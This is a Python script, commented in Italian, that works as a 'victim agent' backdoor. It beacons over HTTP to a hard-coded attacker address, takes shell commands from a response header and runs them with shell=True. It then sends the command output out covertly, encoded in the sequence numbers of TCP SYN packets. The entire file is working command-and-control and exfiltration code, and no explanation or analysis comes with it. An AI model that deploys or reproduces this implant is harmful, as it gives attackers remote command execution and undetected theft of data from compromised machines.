#!/usr/bin/env python3
from scapy.all import *
import struct
import time
import random
import socket
import threading

ATTACKER_IP   = "10.0.0.10"
ATTACKER_PORT = 80
ATTACKER_HTTP = 80
MAGIC         = 0xCAFE0000
MAGIC_MASK    = 0xFFFF0000
BEACON_INTERVAL = 10  # secondi tra un beacon e l'altro

my_sport      = random.randint(1024, 65535)
expected_bytes = None
received       = b""

def is_covert(pkt):
    return (TCP in pkt and
            pkt[TCP].flags == 0x12 and
            (pkt[TCP].seq & MAGIC_MASK) == MAGIC and
            pkt[TCP].dport == my_sport)

def send_covert(message: str):
    data = message.encode()
    length = len(data)
    seq_len = MAGIC | (length & 0xFFFF)
    pkt = IP(dst=ATTACKER_IP) / TCP(sport=my_sport, dport=ATTACKER_PORT, flags="S", seq=seq_len)
    send(pkt, verbose=False)
    time.sleep(0.2)
    for i in range(0, len(data), 2):
        chunk = data[i:i+2]
        if len(chunk) < 2:
            chunk += b'\x00'
        value = struct.unpack(">H", chunk)[0]
        pkt = IP(dst=ATTACKER_IP) / TCP(sport=my_sport, dport=ATTACKER_PORT, flags="S", seq=MAGIC | value)
        send(pkt, verbose=False)
        time.sleep(0.2)

def beacon():
    """Contatta l'attacker via HTTP ogni BEACON_INTERVAL secondi.
    Se l'attacker ha un comando in X-Cmd, lo esegue e manda l'output via covert channel."""
    import subprocess
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ATTACKER_IP, ATTACKER_HTTP))
            sock.send(b"GET /beacon HTTP/1.0\r\n\r\n")
            resp = sock.recv(4096).decode(errors='replace')
            sock.close()

            # Cerca il comando negli header
            cmd = None
            for line in resp.split("\r\n"):
                if line.startswith("X-Cmd:"):
                    cmd = line[len("X-Cmd:"):].strip()
                    break

            if cmd:
                print(f"[*] Received command: {cmd}")
                try:
                    output = subprocess.check_output(
                        cmd, shell=True, stderr=subprocess.STDOUT
                    ).decode(errors='replace')
                except subprocess.CalledProcessError as e:
                    output = e.output.decode(errors='replace')
                print(f"[*] Exfiltrating {len(output)} bytes via covert channel...")
                send_covert(output)
        except Exception as e:
            pass  # attacker non raggiungibile, riprova al prossimo beacon

        time.sleep(BEACON_INTERVAL)

def process(pkt):
    global expected_bytes, received

    if not is_covert(pkt):
        return

    low16 = pkt[TCP].seq & 0xFFFF

    if expected_bytes is None:
        expected_bytes = low16
        received = b""
        print(f"[*] Incoming covert message — expecting {expected_bytes} bytes")
    else:
        chunk = struct.pack(">H", low16)
        received += chunk
        if len(received) >= expected_bytes:
            msg = received[:expected_bytes].decode(errors='replace')
            print(f"\n[+] Received: {msg}\n")
            expected_bytes = None
            received = b""

# Avvia sniffer e beacon in background
threading.Thread(target=beacon, daemon=True).start()
sniff_thread = AsyncSniffer(filter="tcp", prn=process, store=False)
sniff_thread.start()

print(f"[*] Victim agent running (sport={my_sport}, beacon every {BEACON_INTERVAL}s)")
print("[*] Waiting for commands from attacker...")

# Mantieni il processo vivo
while True:
    time.sleep(1)
